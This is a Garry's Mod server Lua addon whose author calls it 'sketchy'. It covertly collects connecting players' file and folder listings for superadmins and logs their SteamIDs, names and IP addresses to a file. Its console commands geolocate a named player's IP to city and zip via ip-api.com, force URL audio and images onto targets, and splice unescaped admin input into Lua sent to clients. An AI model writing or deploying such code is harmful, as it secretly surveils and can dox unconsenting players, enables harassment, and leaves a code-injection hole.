
-- sv_ronnie.lua #NoSimplerr#
-- aka collection of sketchy shit

util.AddNetworkString("MyNameIsRonnie")
util.AddNetworkString("NiceToMeetYouRonnie")
util.AddNetworkString("YayRonnieGreetedMe")
util.AddNetworkString("RonnieWantsYouToSeeSomething")

net.Receive("NiceToMeetYouRonnie", function(len, ply)
	local files = net.ReadTable()
	local folders = net.ReadTable()

	for k, v in pairs(player.GetAll()) do
		if v:IsSuperAdmin() then
			net.Start("YayRonnieGreetedMe")
			net.WriteEntity(ply)
			net.WriteTable(files)
			net.WriteTable(folders)
			net.Send(v)
		end
	end
end)

hook.Add("PlayerInitialSpawn", "RonnieFiles", function(ply)
	net.Start("MyNameIsRonnie")
	net.Send(ply)
end)

-- ip logger

local log = "ronnie/ips.txt"

hook.Add("PlayerConnect", "RonnieIP", function(ply, tip)
	if tip == "none" then return end
	local content = file.Read(log)
	local zucc
	if content then
		zucc = util.JSONToTable(content)
		file.Append(log, util.TableToJSON({sid = ply:SteamID(), nick = ply:Nick(), ip = tip}))
	else
		file.Write(log, util.TableToJSON({sid = ply:SteamID(), nick = ply:Nick(), ip = tip}))
	end
end)

-- concommands

local function FindPlayer(name)
	name = string.lower(name)
	for k, v in ipairs(player.GetHumans()) do
		if string.find(string.lower(v:Nick()), name, 1, true) ~= nil then
			return v
		end
	end
	return false
end

concommand.Add("ronnie_dump", function(ply, cmd, args)
	if not ply:IsSuperAdmin() then return end
	for k, v in pairs(player.GetAll()) do
		ply:PrintMessage(HUD_PRINTCONSOLE, v:SteamID() .. " - " .. v:Nick() .. " - " .. v:IPAddress())
	end
end)

-- what the fuck

concommand.Add("ronnie_locate", function(ply, cmd, args)
	if not ply:IsSuperAdmin() then return end
	local found = FindPlayer(args[1])
	if not found then return end
	http.Fetch("http://ip-api.com/json/" .. found:IPAddress(),
	function(body, len, headers, code)
		if not body then return end
		local tab = util.JSONToTable(body)
		ply:PrintMessage(HUD_PRINTCONSOLE, body)
		if tab.status ~= "success" then return end
		ply:PrintMessage(HUD_PRINTCONSOLE, tab.city .. ", " .. tab.regionName .. ". " .. tab.country .. tab.zip)
	end)
end)

concommand.Add("ronnie_playurl", function(ply, cmd, args)
	if not ply:IsSuperAdmin() then return end
	if not args[1] then return end
	if not args[2] then return end
	local found = FindPlayer(args[1])
	if not found then return end
	found:SendLua(string.format([[
	sound.PlayURL("%s", "", function(s)
		if IsValid(s) then
			s:Play()
		end
	end)
	]], args[2]))
end)

concommand.Add("ronnie_image", function(ply, cmd, args)
	if not ply:IsSuperAdmin() then return end
	if not args[2] then ply:PrintMessage(HUD_PRINTCONSOLE, "input empty, clearing image...") end
	local found = FindPlayer(args[1])
	if not found then return end
	net.Start("RonnieWantsYouToSeeSomething")
	net.WriteString(args[2] or "-snip-")
	net.Send(found)
end)
